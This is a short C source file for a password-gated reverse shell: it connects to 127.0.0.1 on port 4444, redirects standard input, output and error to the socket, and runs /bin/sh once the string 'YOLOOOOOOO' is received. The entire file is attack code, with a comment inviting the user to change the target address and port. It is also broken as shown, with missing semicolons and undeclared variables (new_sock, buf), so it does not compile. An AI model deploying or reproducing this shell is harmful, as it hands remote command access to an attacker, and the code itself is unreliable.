#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


int main()
{
        struct sockaddr_in server;
        int sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        // Change aguments as needed
        char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };


        sock = socket(AF_INET, SOCK_STREAM, 0)
      
        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(arguments[2]));
        server.sin_addr.s_addr = inet_addr(arguments[3]);
        bzero(&server.sin_zero, 8);

        connect(sock, (struct sockaddr *)&server, sockaddr_len)

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        read(new_sock, buf, 16);
        buf[strcspn(buf, "\n")] = 0;
        if (strcmp(arguments[4], buf) == 0)
        {        
              execve(arguments[0], &arguments[0], NULL);
        }
       
}
